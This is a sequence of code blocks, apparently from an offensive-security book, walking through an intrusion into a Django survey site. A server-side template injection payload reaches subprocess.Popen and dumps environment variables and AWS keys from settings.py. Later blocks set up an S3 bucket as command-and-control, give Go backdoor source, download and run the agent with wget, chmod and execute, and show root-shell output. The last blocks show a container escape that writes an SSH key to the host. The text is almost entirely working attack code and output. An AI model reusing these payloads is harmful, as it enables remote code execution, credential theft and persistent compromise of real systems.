["```\ndddd\",'|&$;:`({{@<%=ddd\n```", "```\n# Ruby templates\n<p>\n<%= @product %>\n</p>\n# Play templates (Scala/Java)\n<p>\nCongratulations on product @product\n</p>\n# Jinja or Django templates\n<p>\nCongratulations on product {{product}}\n</p>\n```", "```\n`--snip--`\ntemplate_str = \"\"\"\n    <div>\n        <h1>hello</h1>\n <h3>%s</h3>\n    </div>\n     \"\"\" % user_input\n\nreturn render_template_string(template_str)\n```", "```\n# Payload\n\n{{8*'2'}} # Python: 22222222, PHP: 16\n\n{{8*2}} # Python: 16, PHP: 16\n```", "```\n# Payload\n\nemail=davidshaw@pokemail.net&user={{request.environ}}...\n```", "```\n# Payload\n\nemail=davidshaw@pokemail.net&user=`{{request__class__ }}`...\n\n<class 'django.core.handlers.wsgi.WSGIRequest'>\n```", "```\n# Payload\n\nemail=davidshaw@pokemail.net&user={{request.__class__.`__base__`}}...\n<class 'django.http.request.HttpRequest'>\n\nemail=davidshaw@pokemail.net&user={{request.__class__.__base__.`__base__`}}...\n<class 'object'> 1\n```", "```\n# Payload\n\nemail=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__`.__subclasses__()`}}...\n\n[<class 'type'>,\n <class 'dict_values'>,\n <class 'django.core.handlers.wsgi.LimitedStream'>,\n <class 'urllib.request.OpenerDirector'>,\n <class '_frozen_importlib._ModuleLock'>,\n <class 'subprocess.Popen'>,1\n`--snip--`\n <class 'django.contrib.auth.models.AbstractUser.Meta'>,\n]\n```", "```\n# Payload\n\nemail=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()\n`[282](\"env\", shell=True, stdout=-1).communicate()[0]`}}...\n\nA couple of seconds later, we receive an email spilling out the environment variables of\nthe Python process running on the machine:\nPWD=/opt/`django`/surveysapp\nPYTHON_GET_PIP_SHA256=8d412752ae26b46a39a201ec618ef9ef7656c5b2d8529cdcbe60cd70dc94f40c\nKUBERNETES_SERVICE_PORT_HTTPS=443\nHOME=/root\n`--snip--`\n```", "```\n# Payload\n\nemail=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()\n[282](\"`cat /opt/Django/surveysapp/surveysapp/settings.py`\", shell=True,\nstdout=-1).communicate()[0]}}...\n\nBASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))\nSERVER_EMAIL = \"no-replay@sureveysandstats.com\"\nSES_RO_ACCESSKEY = \"AKIA44ZRK6WSSKDSKJPV\" 1\nSES_RO_SECRETKEY = \"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\" 2\n`--snip--`\n```", "```\nroot@Point1:~/# **vi ~/.aws/credentials**\n[ses]\naws_access_key_id = **AKIA44ZRK6WSSKDSKJPV**\naws_secret_access_key = **M0pQIv3FlDXnbyNFQurMZ9ynxD0gdNkRUP1r0o3Z**\n\nroot@Point1:~/# **aws sts get-caller-identity --profile ses**\n{\n  \"UserId\": \"AIDA4XSWK3WS9K6IDDD0V\",\n  \"Account\": \"886371554408\",\n  \"Arn\": \"arn:aws:iam::886477354405:user/ses_ro_user\"\n}\n```", "```\n# Payload\n\nemail=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()\n[282](\"`wget https://linux-packets-archive.com/runccd; chmod +x runccd; ./runccd&`\", shell=True,\nstdout=-1).communicate()[0]}}...\n\n`<empty>`\n```", "```\n# Payload\n\nemail=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()\n[282](\"`curl http://169.254.169.254/latest`\", shell=True, stdout=-1).communicate()[0]}}...\n\n`<empty>`\n```", "```\nroot@Point1:~/# **aws s3api create-bucket \\**\n**--bucket mxrads-archives-packets-linux \\**\n**--region=eu-west-1 \\**\n**--create-bucket-configuration \\**\n**LocationConstraint=eu-west-1**\n```", "```\nroot@Point1:~/# **aws s3api put-object \\**\n**--bucket mxrads-archives-packets-linux \\**\n**--key beaconTest.html \\**\n**--body beaconTest.html**\n```", "```\nroot@Point1:~/# **aws s3api put-bucket-policy \\**\n**--bucket mxrads-archives-packets-linux \\**\n**--policy file://<(cat <<EOF**\n**{**\n **\"Id\": \"Policy1572645198872\",**\n **\"Version\": \"2012-10-17\",**\n **\"Statement\": [**\n **{**\n **\"Sid\": \"Stmt1572645197096\",**\n **\"Action\": [**\n **\"s3:GetObject\", \"s3:PutObject\"**\n **],**\n **\"Effect\": \"Allow\",**\n **\"Resource\": \"arn:aws:s3:::mxrads-archives-packets-linux/*\",**\n **\"Principal\": \"*\"**\n **}**\n **]**\n**}**\n**EOF)**\n```", "```\n# Payload to the surveysandstats site form\n\nemail=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()\n[282](\" `curl https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/beaconTest.html`,\nshell=True, stdout=-1).communicate()[0]}}...\n\n# Results in email\n<html>hello from beaconTest.html</html>\n```", "```\nfunc main() {\n  reqURL := fmt.Sprintf(\"https://%s.s3.amazonaws.com/%s_req.txt\", *bucket, *key)\n  respURL := fmt.Sprintf(\"https://%s.s3.amazonaws.com/%s_resp.txt\", *bucket, *key)\n\n  client := &http.Client{}\n```", "```\n for {\n   time.Sleep(2 * time.Second)\n   cmd, etag, err = fetchData(client, reqURL, etag)\n`--snip--`\n   go func() {\n       output := execCmd(cmd)\n       if len(output) > 0 {\n          uploadData(client, respURL, output)\n       }\n   }()\n }\n```", "```\nfunc uploadData(client *http.Client, url string, data []byte) error {\n\n req, err := http.NewRequest(\"PUT\", url, bytes.NewReader(data))\n req.Header.Add(\"x-amz-acl\", \"bucket-owner-full-control\")\n _, err = client.Do(req)\n return err\n}\n```", "```\nroot@Point1:~/# **git clone** **https://github.com/HackLikeAPornstar/GreschPolitico**\nroot@Point1:~/# **cd S3Backdoor/S3Agent**\nroot@Point1:~/# **go build -ldflags=\"-s -w\" -o ./runcdd main.go**\nroot@Point1:~/# **aws s3api put-object \\**\n**--bucket mxrads-archives-packets-linux \\**\n**--key runcdd \\**\n**--body runcdd**\n```", "```\nroot@Point1:~/S3Op/# **python main.py**\nStarting a loop fetching results from S3 mxrads-archives-packets-linux\nQueue in commands to be executed\nshell>\n```", "```\n# Payload to the surveysandstats site form\n\nemail=davidshaw@pokemail.net&user={{request.__class__.__base__.__base__.__subclasses__()\n[282](\"`wget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/runcdd %3B`\n`chmod %2Bx runcdd %3B ./runcdd%26`, shell=True, stdout=-1).communicate()[0]}}...\n```", "```\nwget https://mxrads-archives-packets-linux.s3-eu-west-1.amazonaws.com/runcdd\nchmod +x runcdd\n./runcdd &\n```", "```\nroot@Point1:~S3Fetcher/# **python main.py**\nStarting a loop fetching results from S3 mxrads-archives-packets-linux\n\nNew target called home d5d380c41fa4\nshell> **id**\nWill execute id when victim checks in\n\n1 uid=0(root) gid=0(root) groups=0(root)\n```", "```\nshell> **id**\nuid=0(root) gid=0(root) groups=0(root)\n\nshell> **cat /proc/1/cmdline**\n/bin/sh\n\nshell> **cat /proc/1/cgroup**\n11:freezer:/docker/5ea7b36b9d71d3ad8bfe4c58c65bbb7b541\n10:blkio:/docker/5ea7b36b9d71d3ad8bfe4c58c65bbb7b541dc\n9:cpuset:/docker/5ea7b36b9d71d3ad8bfe4c58c65bbb7b541dc\n`--snip--`\n\nshell> **cat /proc/1/mounts**\noverlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/6CWK4O7ZJREMTOZGIKSF5XG6HS\n```", "```\n# Demo lab\nroot@DemoContainer:/# **ls /dev**\nautofs           kmsg                ppp       tty10\nbsg              lightnvm            psaux     tty11\n`--snip--`\n# tty devices are usually filtered out by cgroups, so we must be inside a privileged container\n\nroot@DemoContainer:/# **fdisk -l**\nDisk /dev/dm-0: 23.3 GiB, 25044189184 bytes, 48914432 sectors\nUnits: sectors of 1 * 512 = 512 bytes\n`--snip--`\n\n# mount the host's main partition\nroot@DemoContainer:/# **mount /dev/dm-0 /mnt && ls /mnt**\nbin   dev  home lib  lost+found  mnt  proc...\n\n# inject our SSH key into the root home folder\nroot@DemoContainer:/# echo \"ssh-rsa AAAAB3NzaC1yc2EA...\" > /mnt/root/.ssh/authorized_keys\n\n# get the host's IP and SSH into it\nroot@DemoContainer:/# **ssh root@172.17.0.1**\n\nroot@host:/#\n```", "```\nshell> **cat /proc/self/status |grep Cap**\nCapInh: 00000000a80425fb\nCapPrm: 00000000a80425fb\nCapEff: 00000000a80425fb\nCapBnd: 00000000a80425fb\nCapAmb: 0000000000000000\n\nroot@Bouncer:/# **capsh --decode=00000000a80425fb**\n0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid\n,cap_kill,cap_setgid,cap_setuid,cap_setpcap,...\n```", "```\nshell> **curl --unix-socket /var/run/docker.sock http://localhost/images/json**\ncurl: (7) Couldn't connect to server\n\nshell> **ls /var/run/docker.sock**\nls: cannot access '/var/run/docker.sock': No such file or directory\nshell> **mount | grep docker**\n\n# docker.sock not found\n```", "```\nshell> **uname -a**\nLinux f1a7a6f60915 4.14.146-119.123.amzn2.x86_64 #1\n```", "```\nshell> **env**\n\nPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nHOME=/root\nKUBERNETES_SERVICE_PORT_HTTPS=443\nKUBERNETES_PORT_443_TCP_PORT=443\nKUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443\n`--snip--`\n```"]